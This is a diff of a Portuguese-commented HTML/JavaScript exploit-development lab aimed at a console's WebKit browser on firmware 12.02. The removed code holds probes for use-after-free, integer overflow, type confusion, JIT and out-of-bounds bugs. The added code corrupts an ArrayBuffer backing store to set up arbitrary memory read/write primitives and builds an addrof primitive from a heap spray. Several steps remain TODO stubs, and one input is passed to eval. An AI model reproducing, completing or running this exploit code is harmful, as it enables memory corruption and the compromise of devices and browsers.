-        function uaf_createFakeObjectOptimized_v2(address) {
-            const FNAME = 'uaf_createFakeObj'; log(`Tentando criar objeto falso (UAF) em ${hex(address)}...`, 'info', FNAME);
-            log("Implementação REAL de uaf_createFakeObjectOptimized_v2 é NECESSÁRIA (UAF).", 'critical', FNAME);
-            log("  Isto envolve usar uma PRIMITIVA DE ESCRITA (obtida pelo UAF) e FW1202_OFFSETS.", 'asm', FNAME);
-            log("Criação de objeto falso (UAF - Lógica Real Necessária).", 'warn', FNAME); return null;
-        }
-        async function uaf_attemptAddrofActual() {
-            const FNAME = 'UAF_attemptAddrof'; log("Iniciando tentativa de addrof (UAF)...", 'subtest', FNAME);
-            log("INFO: Esta função precisa ser adaptada com uma técnica UAF específica para FW 12.02.", 'warn', FNAME);
-            let success = false; let leakedPtr = null;
-            try {
-                log("Fase 1: Setup (UAF)...", 'info', FNAME); if (!uaf_setupPrimitives()) throw new Error("Falha setup (UAF)."); await sleep(100);
-                log("Fase 2: Spray de Heap (UAF)...", 'info', FNAME);
-                for (let i = 0; i < UAF_NUM_SPRAY_OBJS; i++) { try { uaf_sprayArr[i] = uaf_allocateBuffer(UAF_OBJ_SIZE); } catch (e) { log(`Erro spray ${i+1} (UAF), continuando...`, 'warn', FNAME); await sleep(30); } if (i>0 && i%50===0) { log(`Spray ${i}/${UAF_NUM_SPRAY_OBJS} (UAF)...`, 'info', FNAME); await sleep(50); } }
-                log(`Spray (UAF) de ${uaf_sprayArr.filter(Boolean).length} objetos concluído.`, 'good', FNAME); await sleep(100);
-                log("Fase 3: Trigger UAF...", 'info', FNAME);
-                log("TODO: Implementar lógica de trigger UAF específica para FW 12.02 aqui.", 'critical', FNAME);
-                log("  Analisar `JSC::JSCell::deleteProperty` e outras funções de `funcoes especificas.txt`.", 'asm', FNAME);
-                let tempRef = uaf_leakerObj; uaf_leakerObj = null; log("Ref principal a 'uaf_leakerObj' removida (UAF).", 'info', FNAME); await sleep(50); uaf_triggerGCOptimized(); await sleep(100); log("Potencial UAF acionado (ação específica necessária).", 'warn', FNAME); tempRef = null;
-                log("Fase 4: Procurando Vazamento (UAF)...", 'info', FNAME); leakedPtr = uaf_findLeakedPointer();
-                if (leakedPtr) { log(`SUCESSO (POTENCIAL UAF): Ponteiro: ${hex(leakedPtr)}`, 'leak', FNAME); success = true; log("Fase 5: Tentando Objeto Falso (UAF)...", 'info', FNAME); let fakeObj = uaf_createFakeObjectOptimized_v2(leakedPtr); if (fakeObj) { log("SUCESSO (POTENCIAL UAF): Obj Falso!", 'success', FNAME); } else { log("Falha obj falso (UAF).", 'warn', FNAME); }
-                } else { log("FALHA (UAF): Nenhum vazamento.", 'error', FNAME); success = false; }
-            } catch (e) { log(`ERRO CRÍTICO (UAF): ${e.message}`, 'critical', FNAME); if (e.stack) log(e.stack.split('\\n').join('\\n  '), 'critical', FNAME); success = false;
-            } finally { uaf_sprayArr = []; uaf_leakerObj = null; log(`Status Final (UAF): ${success ? 'SUCESSO (POTENCIAL)' : 'FALHA (ESPERADO SEM LÓGICA REAL)'}`, success ? 'success' : 'error', FNAME); }
-        }
-
-        // --- Teste 2: Integer Overflow/Underflow (Detalhado) ---
-        async function testIntegerOverflow() {
-            const FNAME = 'IntegerOverflow'; log("Iniciando Teste de Integer Overflow (Detalhado)...", 'subtest', FNAME);
-            try { /* ... (Lógica do testIntegerOverflow da resposta anterior) ... */
-                log("Tentativa 1: Estouro positivo em tamanho de TypedArray.", 'info', FNAME);
-                let veryLargeSize = Math.pow(2,32); log(`Tentando criar Uint8Array com tamanho problemático: ${hex(veryLargeSize)}`, 'info', FNAME);
-                try { let ta = new Uint8Array(veryLargeSize); log(`Uint8Array alocado com tamanho ${ta.length}.`, 'warn', FNAME); } catch (e) { log(`Erro ao alocar Uint8Array (esperado): ${e.message}.`, 'good', FNAME); }
-                await sleep(50);
-                log("Tentativa 2: Estouro de inteiro em cálculo de offset para DataView.", 'info', FNAME);
-                let ab = new ArrayBuffer(1024); let dv = new DataView(ab); let baseOffset = 0x7FFFFFF0; let addition = 0x20;
-                let calculatedOffset_js = baseOffset + addition; let calculatedOffset_int32 = (baseOffset + addition) | 0;
-                log(`Offset base: ${hex(baseOffset)}, Adição: ${hex(addition)}`, 'info', FNAME); log(`Offset calculado (JS num): ${hex(calculatedOffset_js)}`, 'info', FNAME); log(`Offset calculado (forçado int32): ${hex(calculatedOffset_int32)}`, 'info', FNAME);
-                log("  INFO: Analisar `JSObjectGetArrayBufferBytesPtr` da FW 12.02.", 'asm', FNAME);
-                try { log(`Tentando dv.getUint32(${hex(calculatedOffset_int32)})`, 'info', FNAME); let val = dv.getUint32(calculatedOffset_int32, true); log(`Valor lido (offset int32): ${hex(val)}. Pode ser OOB.`, 'warn', FNAME); } catch (e) { log(`Erro ao acessar DataView (offset int32): ${e.message}.`, 'error', FNAME); }
-            } catch (e) { log(`Erro no teste Integer Overflow: ${e.message}`, 'error', FNAME); }
-            log("Teste Integer Overflow (Detalhado) Concluído.", 'subtest', FNAME);
-        }
-
-        // --- Teste 3: Type Confusion (Detalhado) ---
-        async function testTypeConfusion() {
-            const FNAME = 'TypeConfusion'; log("Iniciando Teste de Type Confusion (Detalhado)...", 'subtest', FNAME);
-            log("ALERTA: Requer escrita arbitrária para ser efetivo.", 'critical', FNAME);
-            log("  INFO: Analisar `JSC::JSCell::deleteProperty`, `JSC::iteratorForIterable` e `JSCell.txt` da FW 12.02.", 'asm', FNAME);
-            try { /* ... (Lógica do testTypeConfusion da resposta anterior) ... */
-                let obj1 = { id: 1, name: "ObjetoUm", value: 100, methodA: () => log("Método A de obj1 chamado", 'info', FNAME) };
-                let obj2_target_type = new Uint32Array(10);
-                log(`obj1 (original): ${typeof obj1}, tem método 'methodA'? ${'methodA' in obj1}`, 'info', FNAME);
-                log(`obj2_target_type (alvo): ${typeof obj2_target_type}, tem 'buffer'? ${'buffer' in obj2_target_type}`, 'info', FNAME);
-                log("SIMULAÇÃO: 'Corrompendo' o tipo de obj1 (requer escrita arbitrária e offsets de StructureID).", 'vuln', FNAME);
-                try { log("Tentando acessar obj1.buffer (como se fosse Uint32Array)...", 'info', FNAME); if (obj1.buffer) { log("Propriedade 'buffer' encontrada em obj1! Inesperado sem confusão real.", 'warn', FNAME); } else { log("Propriedade 'buffer' NÃO encontrada em obj1 (esperado).", 'info', FNAME); }
-                } catch (e) { log(`Erro ao acessar obj1.buffer: ${e.message}`, 'error', FNAME); }
-            } catch (e) { log(`Erro no teste Type Confusion: ${e.message}`, 'error', FNAME); }
-            log("Teste Type Confusion (Detalhado) Concluído.", 'subtest', FNAME);
-        }
-
-        // --- Teste 4: JIT Optimization Bug (Detalhado) ---
-        async function testJITBug() {
-            const FNAME = 'JIT'; log("Iniciando Teste de Bug de Otimização JIT (Detalhado)...", 'subtest', FNAME);
-            log("  INFO: Analisar funções JITadas ou helpers em `funcoes especificas.txt` se relevantes.", 'asm', FNAME);
-            try { /* ... (Lógica do testJITBug da resposta anterior) ... */
-                function jitStressFunction(iterations, initial_val) { let p = initial_val; let sum = 0; for (let i = 0; i < iterations; i++) { if (i % 3 === 0) p = { x: i, y: i + 1 }; else if (i % 3 === 1) p = [i, i + 1, i + 2]; else p = i * 10; if (p.x !== undefined) sum += p.x; else if (p.length !== undefined) sum += p[0]; else sum += p; } return sum; }
-                log("Aquecendo JIT com a função de stress...", 'info', FNAME); for (let i = 0; i < 200; i++) { jitStressFunction(500, 1); } log("JIT 'aquecido'.", 'good', FNAME); await sleep(50);
-                try { let result = jitStressFunction(500, null); log(`Resultado com 'null': ${result}.`, 'info', FNAME); result = jitStressFunction(500, { z: 100 }); log(`Resultado com objeto {z:100}: ${result}.`, 'info', FNAME); } catch(e) { log(`ERRO INESPERADO pós-JIT: ${e.message}.`, 'error', FNAME); }
-            } catch (e) { log(`Erro no teste JIT: ${e.message}`, 'error', FNAME); }
-            log("Teste JIT Bug (Detalhado) Concluído.", 'subtest', FNAME);
-        }
-
-        // --- Teste 5: API Abuse (WebGL Detalhado) ---
-        async function testAPIAbuse() {
-            const FNAME = 'APIAbuse'; log("Iniciando Teste de Abuso de API (WebGL Detalhado)...", 'subtest', FNAME);
-            log("  INFO: A análise do `libSceNKWebkit.sprx.txt` (se contiver código de drivers gráficos) pode guiar este teste.", 'asm', FNAME);
-            let canvas, gl; try { /* ... (Lógica do testAPIAbuse da resposta anterior, com try/catch e limpeza) ... */
-                canvas = document.createElement('canvas'); gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) { log("WebGL não suportado.", 'warn', FNAME); return; } log(`Contexto WebGL obtido: ${gl.constructor.name}`, 'good', FNAME);
-                try { const texture = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, texture); const width = 16384; const height = 16384; gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, null); log(`texImage2D(${width}x${height}, null pixels) chamado.`, 'warn', FNAME); } catch(e) { log(`Erro em texImage2D: ${e.message}.`, 'error', FNAME); }
-                await sleep(100);
-            } catch (e) { log(`Erro no teste API Abuse (WebGL): ${e.message}`, 'error', FNAME);
-            } finally { if (gl) { const loseCtx = gl.getExtension('WEBGL_lose_context'); if (loseCtx) loseCtx.loseContext(); } canvas = null; gl = null; }
-            log("Teste API Abuse (WebGL Detalhado) Concluído.", 'subtest', FNAME);
-        }
-
-        // --- Teste 6: OOB Read (Info Leak - Conceitual) ---
-        async function testOOBRead() {
-            const FNAME = 'OOBRead';
-            log("Iniciando Teste de OOB Read (Info Leak - Conceitual)...", 'subtest', FNAME);
-            log("INFO: Este teste tentaria ler fora dos limites de um array/TypedArray.", 'warn', FNAME);
-            log("  INFO: Funções como `JSObjectGetArrayBufferBytesPtr` ou lógicas de acesso a array em `funcoes especificas.txt`", 'asm', FNAME);
-            log("        devem ser analisadas para entender como os limites são checados na FW 12.02.", 'asm', FNAME);
-            try {
-                const OOB_ARRAY_SIZE = 10;
-                let oobArray = new Uint32Array(OOB_ARRAY_SIZE);
-                for (let i = 0; i < OOB_ARRAY_SIZE; i++) { oobArray[i] = 0x41414141 + i; }
-
-                let adjacentSpray = []; const NUM_ADJACENT_SPRAY = 50; const ADJACENT_OBJ_SIZE = 64;
-                log("Pulverizando objetos adjacentes para OOB Read...", 'info', FNAME);
-                for (let i = 0; i < NUM_ADJACENT_SPRAY; i++) {
-                    let sprayObj = new ArrayBuffer(ADJACENT_OBJ_SIZE);
-                    new Uint32Array(sprayObj)[0] = 0x42424242 + i; // Padrão
-                    adjacentSpray.push(sprayObj);
-                }
-                log("Pulverização adjacente concluída.", 'good', FNAME);
-
-                log("Placeholder: Lógica para acionar OOB Read e ler memória adjacente seria implementada aqui.", "critical", FNAME);
-                log("  Isto exigiria uma vulnerabilidade específica (bug de JIT, cálculo de índice incorreto, etc.)", 'asm', FNAME);
-                log("  para permitir que `oobArray[OOB_ARRAY_SIZE]` ou similar leia memória real.", 'asm', FNAME);
-                // Exemplo de como seria o acesso se a primitiva OOB existisse:
-                // let oob_value = hypothetical_oob_read_uint32(oobArray, OOB_ARRAY_SIZE); // Lê 4 bytes após o array
-                // if (oob_value !== undefined) log(`Valor OOB (simulado): ${hex(oob_value)}`, 'leak', FNAME);
-
-                log("Nenhum OOB Read real tentado (placeholder).", 'warn', FNAME);
-            } catch (e) { log(`Erro no teste de OOB Read: ${e.message}`, 'error', FNAME); }
-            log("Teste de OOB Read (Info Leak - Conceitual) Concluído.", 'subtest', FNAME);
-        }
-
-
-        // --- Gerenciador de Testes e Event Listeners ---
-        const runTest = async (testFunction, btn) => {
-            if (btn) btn.disabled = true;
-            const testName = testFunction ? (testFunction.name || 'Teste Desconhecido') : 'Teste Indefinido';
-            log(`==== INICIANDO: ${testName} ====`, 'test', 'Main');
-            if (testFunction) {
-                await testFunction();
-            } else {
-                log(`Erro: Função de teste ${testName} não definida.`, 'critical', 'Main');
             }
-            log(`==== CONCLUÍDO: ${testName} ====`, 'test', 'Main');
-            if (btn) btn.disabled = false;
-            alert(`${testName} concluído. Verifique os logs.`);
-        };
+            
+            // Esta função agora é o FOCO PRINCIPAL para obter R/W arbitrário.
+            // Ela depende de um addrof funcional para encontrar a vítima,
+            // e de arb_read/arb_write (que podem ser o oob_dataview_real inicialmente)
+            // para ler/escrever os ponteiros/campos.
+            async function attemptArrayBufferCorruptionAndSetupArbRW() {
+                const FNAME = "ArrayBufferCorruptionAndSetupArbRW";
+                log("--- Tentando Corromper `ArrayBuffer` da Vítima e Definir R/W Arbitrário ---", "test", FNAME);
+                
+                if (!victim_view_for_arb_rw) { 
+                    log("Objeto vítima `victim_view_for_arb_rw` não configurado. Execute 'Preparar Vítima' no Passo 1.C primeiro.", "error", FNAME);
+                    return;
+                }
+                if (!addrof_primitive) { log("`addrof_primitive` é necessária. Implemente e teste-a primeiro (Passo 1.C).", "error", FNAME); return; }
+                
+                // Se arb_read/write ainda não foram estabelecidas, precisamos de uma forma de ler/escrever para executar a corrupção.
+                // Se o oob_dataview_real tiver alcance suficiente para atingir os metadados da vítima (após addrof), podemos usá-lo.
+                // Esta é uma situação de "ovo e galinha". Idealmente, o OOB inicial é forte o suficiente.
+                let current_read = arb_read_primitive;
+                let current_write = arb_write_primitive;
 
-        if (runUAFBtn) runUAFBtn.addEventListener('click', () => runTest(uaf_attemptAddrofActual, runUAFBtn));
-        if (runIntegerOverflowBtn) runIntegerOverflowBtn.addEventListener('click', () => runTest(testIntegerOverflow, runIntegerOverflowBtn));
-        if (runTypeConfusionBtn) runTypeConfusionBtn.addEventListener('click', () => runTest(testTypeConfusion, runTypeConfusionBtn));
-        if (runJITBtn) runJITBtn.addEventListener('click', () => runTest(testJITBug, runJITBtn));
-        if (runAPIAbuseBtn) runAPIAbuseBtn.addEventListener('click', () => runTest(testAPIAbuse, runAPIAbuseBtn));
-        if (runOOBReadBtn) runOOBReadBtn.addEventListener('click', () => runTest(testOOBRead, runOOBReadBtn)); // Novo botão
+                if (!current_read || !current_write) {
+                    log("`arb_read_primitive` ou `arb_write_primitive` globais não estão prontas.", "warn", FNAME);
+                    if (oob_dataview_real) {
+                        log("Tentando usar `oob_dataview_real` para a corrupção inicial. Isso requer que `oob_dataview_real` possa alcançar os alvos.", "info", FNAME);
+                        // Definir funções de leitura/escrita temporárias baseadas no oob_dataview_real
+                        // Estas são limitadas ao alcance e capacidade do oob_dataview_real
+                        const oob_read_temp = (address64, size) => {
+                            // TODO (VOCÊ PRECISA IMPLEMENTAR):
+                            // Calcule o offset DENTRO do oob_dataview_real que corresponde ao address64.
+                            // Isso requer saber o endereço base que o oob_dataview_real cobre.
+                            // Se oob_leaked_ptr_real.offset_in_oob_buffer é onde o leak ocorreu, e oob_leaked_ptr_real.value
+                            // é o valor nesse local, você pode tentar extrapolar.
+                            // Esta é uma parte complexa e depende de como o oob_dataview_real foi criado.
+                            log(`oob_read_temp para ${address64.toString(true)}: <span class="todo">PRECISA DE IMPLEMENTAÇÃO PARA MAPEAMENTO DE ENDEREÇO</span>`, "warn", "oob_rw_temp");
+                            // Exemplo muito básico (e provavelmente incorreto sem mapeamento de endereço):
+                            // try { let d = new Uint8Array(size); for(let i=0; i<size; i++) d[i] = oob_dataview_real.getUint8(address64.low() + i); return d; } catch(e){return null;}
+                            return null; 
+                        };
+                        const oob_write_temp = (address64, data_u8) => {
+                            log(`oob_write_temp para ${address64.toString(true)}: <span class="todo">PRECISA DE IMPLEMENTAÇÃO PARA MAPEAMENTO DE ENDEREÇO</span>`, "warn", "oob_rw_temp");
+                            // try { for(let i=0; i<data_u8.length; i++) oob_dataview_real.setUint8(address64.low() + i, data_u8[i]); return true; } catch(e){return false;}
+                            return false;
+                        };
+                        current_read = oob_read_temp;
+                        current_write = oob_write_temp;
+                        log("Primitivas de leitura/escrita temporárias (baseadas em OOB) definidas. Sua eficácia é incerta.", "info", FNAME);
+                    } else {
+                        log("Nenhuma primitiva de OOB (`oob_dataview_real`) ou R/W arbitrária disponível.", "error", FNAME);
+                        return;
+                    }
+                }
 
-        if (clearLogBtn) clearLogBtn.addEventListener('click', () => {
-            outputDiv.innerHTML = '';
-            log("Log limpo.", 'info', 'Main');
-        });
+                // Passo 1: Obter o endereço do JSCell do victim_view_for_arb_rw (que é um Uint8Array)
+                addr_jscell_victim_view = addrof_primitive(victim_view_for_arb_rw);
+                if (!addr_jscell_victim_view) { log("Falha ao obter o endereço do JSCell da vítima com `addrof`.", "error", FNAME); return; }
+                log(`Endereço do JSCell de victim_view_for_arb_rw (Uint8Array): ${addr_jscell_victim_view.toString(true)}`, "leak", FNAME);
 
-        log("Suite de Testes Completa Carregada. Offsets precisam ser verificados e preenchidos!", 'critical', 'Main');
-        log("Use os arquivos de assembly e PSFree para refinar a lógica de cada teste.", 'info', 'Main');
+                // Passo 2: Ler o ponteiro para o ArrayBufferBackingStore
+                const ptr_to_backing_store_location = addr_jscell_victim_view.add(JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET);
+                log(`Tentando ler ponteiro para BackingStore em: ${ptr_to_backing_store_location.toString(true)} (JSCell_View + ${JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET.toString()})`, "info", FNAME);
+                const backing_store_ptr_bytes = current_read(ptr_to_backing_store_location, 8);
 
+                if (!backing_store_ptr_bytes || backing_store_ptr_bytes.length < 8) { log("Falha ao ler ponteiro para ArrayBufferBackingStore.", "error", FNAME); return; }
+                addr_backing_store_of_victim = new AdvancedInt64(backing_store_ptr_bytes);
+                log(`Endereço do ArrayBufferBackingStore da vítima: ${addr_backing_store_of_victim.toString(true)}`, "leak", FNAME);
+                log("Use HexDump para verificar a estrutura do BackingStore neste endereço (deve ter m_vector @ +0x10, m_byteLength @ +0x20).", "info", FNAME);
+
+                // Passo 3: Corromper m_vector e m_byteLength DENTRO do ArrayBufferBackingStore
+                const addr_m_vector_field = addr_backing_store_of_victim.add(OFFSET_BACKING_STORE_VECTOR_PTR);
+                const addr_m_byteLength_field = addr_backing_store_of_victim.add(OFFSET_BACKING_STORE_BYTE_LENGTH);
+
+                const new_vector_val = AdvancedInt64.Zero; 
+                const new_length_val_u32 = 0xFFFFFFFF; 
+                const new_length_val_bytes = new Uint8Array(new AdvancedInt64(new_length_val_u32).bytes.slice(0,4)); 
+
+                log(`Escrevendo novo m_vector (${new_vector_val.toString(true)}) em ${addr_m_vector_field.toString(true)}`, "info", FNAME);
+                let write_ok_vector = current_write(addr_m_vector_field, new_vector_val.bytes);
+                
+                log(`Escrevendo novo m_byteLength (${generalUtils.toHexLab(new_length_val_u32)}) em ${addr_m_byteLength_field.toString(true)}`, "info", FNAME);
+                let write_ok_length = current_write(addr_m_byteLength_field, new_length_val_bytes); 
+
+                await PAUSE_LAB(100);
+
+                if (write_ok_vector && write_ok_length) {
+                    log("Corrupção de m_vector e m_byteLength via `current_write` (aparentemente) bem-sucedida!", "vuln", FNAME);
+                    
+                    const underlying_corrupted_buffer = victim_view_for_arb_rw.buffer; // O ArrayBuffer associado ao Uint8Array
+                    log(`Verificando underlying_corrupted_buffer.byteLength: ${underlying_corrupted_buffer.byteLength}`, "info", FNAME);
+
+                    if (underlying_corrupted_buffer.byteLength === new_length_val_u32 || underlying_corrupted_buffer.byteLength === (new_length_val_u32 >>> 0)) {
+                        log("SUCESSO CONFIRMADO! O byteLength do ArrayBuffer subjacente reflete a corrupção.", "critical", FNAME);
+                        corrupted_data_view_for_arb_rw = new DataView(underlying_corrupted_buffer);
+                        log("`corrupted_data_view_for_arb_rw` (DataView sobre o buffer corrompido) criado.", "good", FNAME);
+                        log("Este DataView agora DEVE permitir Leitura/Escrita Arbitrária total.", "good", FNAME);
+
+                        arb_read_primitive = (address64, size) => { /* ... (mesma da v2.4) ... */ if (!corrupted_data_view_for_arb_rw) { log("corrupted_data_view_for_arb_rw não está pronto.", "error", "arb_read_GLOBAL"); return null; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_read_GLOBAL"); return null;} try { let result = new Uint8Array(size); if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0) ) {} for (let i = 0; i < size; i++) { result[i] = corrupted_data_view_for_arb_rw.getUint8(address64.low() + i); } return result; } catch (e) { log(`Erro em arb_read_GLOBAL(${address64.toString(true)}, ${size}): ${e.message}`, "error", "arb_read_GLOBAL"); return null; } };
+                        arb_write_primitive = (address64, data_array_or_u8) => { /* ... (mesma da v2.4) ... */ if (!corrupted_data_view_for_arb_rw) { log("corrupted_data_view_for_arb_rw não está pronto.", "error", "arb_write_GLOBAL"); return false; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_write_GLOBAL"); return false;} if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0)) {} try { const data_u8 = (data_array_or_u8 instanceof Uint8Array) ? data_array_or_u8 : new Uint8Array(data_array_or_u8); for (let i = 0; i < data_u8.length; i++) { corrupted_data_view_for_arb_rw.setUint8(address64.low() + i, data_u8[i]); } return true; } catch (e) { log(`Erro em arb_write_GLOBAL(${address64.toString(true)}, data): ${e.message}`, "error", "arb_write_GLOBAL"); return false; } };
+                        
+                        log("NOVAS PRIMITIVAS `arb_read_primitive` e `arb_write_primitive` GLOBAIS ATIVAS!", "critical", FNAME);
+                        log("Use o HexDump no Passo 6 para testar a leitura arbitrária.", "info", FNAME);
+                    } else {
+                         log(`DISCREPÂNCIA no byteLength do buffer subjacente! Atual: ${underlying_corrupted_buffer.byteLength}, Esperado (U32): ${new_length_val_u32 >>> 0}`, "error", FNAME);
+                    }
+                } else {
+                    log("Falha ao corromper m_vector e/ou m_byteLength via escrita.", "error", FNAME);
+                }
+            }
+            
+            async function attemptBaseAddressLeak() { /* ... (mesma da v2.4) ... */ }
+            async function searchMemoryForValue() { /* ... (mesma da v2.4) ... */ }
+
+            async function manualSetupAndAddrofTest() {
+                const FNAME = "manualSetupAndAddrofTest";
+                if (!await setupHeapAndVictim()) return;
+                await testAddrof();
+            }
+
+            async function testAddrof() {
+                const FNAME = "testAddrof";
+                log("--- Testando `addrof(obj)` ---", "test", FNAME);
+                let objNameToTest = document.getElementById('addrofObjectName').value;
+                let objToTest;
+                try { 
+                    objToTest = eval(objNameToTest); // CUIDADO com eval. Use apenas para objetos conhecidos.
+                    if (typeof objToTest === 'undefined') throw new Error("Objeto não encontrado ou undefined.");
+                } catch(e) { 
+                    log(`Erro ao obter objeto '${objNameToTest}': ${e.message}`, "error", FNAME); 
+                    if (objNameToTest === "victim_view_for_arb_rw_GLOBAL" && !window.victim_view_for_arb_rw_GLOBAL) {
+                        log("Execute 'Preparar Vítima' primeiro se estiver testando `victim_view_for_arb_rw_GLOBAL`.", "warn", FNAME);
+                    }
+                    return;
+                }
+                log(`Testando addrof para: ${objNameToTest}`, "info", FNAME);
+
+                if (!arb_read_primitive) { 
+                    log("`arb_read_primitive` é necessária para a implementação robusta de `addrof`. Tente obtê-la primeiro (Passo 1.A).", "error", FNAME);
+                    log("Se você tem uma OOB Read inicial (`oob_dataview_real`) muito boa, pode tentar uma implementação de `addrof` mais limitada com ela.", "info", FNAME);
+                     if (oob_leaked_ptr_real) log(`Lembre-se do OOB leak inicial: ${oob_leaked_ptr_real.value.toString(true)}`, "info");
+                    // return; // Comentar para permitir a execução do stub conceitual abaixo
+                }
+
+                if (!addrof_primitive) {
+                    addrof_primitive = (target_obj) => {
+                        const FIMPL = "addrof_impl";
+                        log("`addrof_primitive` (Conceitual): Tentando encontrar endereço...", "tool", FIMPL);
+                        // Esta é uma implementação CONCEITUAL e precisa de MUITA adaptação e RE.
+                        // Pré-requisito: arb_read_primitive funcional OU uma oob_dataview_real muito versátil.
+
+                        // Estratégia:
+                        // 1. Spray de Objetos: Alocar muitos objetos (ex: Array) e colocar o `target_obj` entre eles.
+                        //    Isso aumenta a chance de o `target_obj` estar perto de algo cujo endereço você possa vazar/deduzir,
+                        //    ou dentro de uma área que você possa escanear.
+                        const spray_size = 100;
+                        let object_spray = [];
+                        for (let i = 0; i < spray_size; i++) {
+                            object_spray.push({marker_start: 0x41414141+i, obj: (i === Math.floor(spray_size/2) ? target_obj : {dummy:0xB1B1B1B1+i}), marker_end: 0x42424242+i });
+                        }
+                        log(`Spray de ${spray_size} objetos criado. O alvo está no meio.`, "info", FIMPL);
+
+                        // 2. Encontrar o Spray na Memória:
+                        //    - Se você tem um `oob_leaked_ptr_real` que aponta para o heap JS, comece a escanear a partir daí.
+                        //    - Use `arb_read_primitive` (ou `oob_dataview_real` com limitações) para procurar pelos `marker_start`.
+                        let base_scan_address = oob_leaked_ptr_real ? oob_leaked_ptr_real.value : new AdvancedInt64("0x1c0000000"); // EXEMPLO DE ENDEREÇO DE HEAP
+                        let found_object_jscell_address = null;
+
+                        log(`Iniciando varredura de memória a partir de ${base_scan_address.toString(true)} para encontrar o spray...`, "info", FIMPL);
+                        // <span class="todo">TODO: Implementar lógica de varredura aqui.</span>
+                        //  for (let scan_offset = 0; scan_offset < 0x100000 /* Exemplo de range */; scan_offset += 8 /* Alinhamento JSCell */) {
+                        //      let current_addr = base_scan_address.add(new AdvancedInt64(scan_offset));
+                        //      let potential_marker_bytes = arb_read_primitive(current_addr.add(OFFSET_TO_MARKER_IN_SPRAYED_OBJ), 4);
+                        //      if (potential_marker_bytes && readWriteUtils.read32(potential_marker_bytes,0)startsWith(0x41414141) ) {
+                        //          // Encontrou um marcador! Agora precisa verificar se é o objeto correto e obter o ponteiro para `target_obj`.
+                        //          // Se a estrutura do objeto pulverizado for {marker, JSCell_ptr_target_obj, marker},
+                        //          // então leia JSCell_ptr_target_obj.
+                        //          // O endereço do JSCell_ptr_target_obj seria current_addr.add(OFFSET_TO_JSCELL_PTR_IN_SPRAYED_OBJ)
+                        //          // found_object_jscell_address = read_qword(that_address);
+                        //          // break;
+                        //      }
+                        //  }
+                        log("<span class='todo'>IMPLEMENTAR VARREDURA DE HEAP E LÓGICA DE IDENTIFICAÇÃO DE OBJETO AQUI</span>", "warn", FIMPL);
+
+
+                        if (found_object_jscell_address) {
+                            log(`addrof: Endereço candidato para JSCell de target_obj: ${found_object_jscell_address.toString(true)}`, "leak", FIMPL);
+                            // Verificação adicional: Ler o StructureID de found_object_jscell_address
+                            let struct_id_bytes = arb_read_primitive(found_object_jscell_address.add(OFFSET_JSCELL_STRUCTURE_ID), 8);
+                            if (struct_id_bytes) {
+                                log(`  StructureID lido em ${found_object_jscell_address.toString(true)}: ${new AdvancedInt64(struct_id_bytes).toString(true)}`, "info", FIMPL);
+                                // TODO: Comparar com StructureIDs conhecidos se possível.
+                            }
+                            return found_object_jscell_address;
+                        } else {
+                            log("addrof: Não foi possível encontrar o objeto alvo no spray (lógica de varredura não implementada).", "warn", FIMPL);
+                            return null;
+                        }
+                    };
+                    log("`addrof_primitive` (conceitual com estratégia de spray) definida.", "info", FNAME);
+                }
+                
+                let addr = addrof_primitive(objToTest);
+                if(addr) { log(`addrof(${objNameToTest}) = ${addr.toString(true)}`, "leak", FNAME); } 
+                else { log(`addrof(${objNameToTest}) falhou. Verifique a implementação e logs de 'addrof_impl'.`, "warn", FNAME); }
+            }
+
+            async function testFakeobj() { /* ... (implementação da v2.3) ... */ }
+        </script>
+    </div>
+    
+    <script>
+        log("Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado) Carregado.", "good", "Init");
+        log("Passos 2-6 removidos para foco. Concentre-se em implementar o Passo 1.", "info", "Init");
+        log("CRÍTICO: Implemente `addrof_primitive` primeiro. Depois, use-o para `attemptArrayBufferCorruptionAndSetupArbRW`.", "warn", "Init");
     </script>
 </body>
 </html>
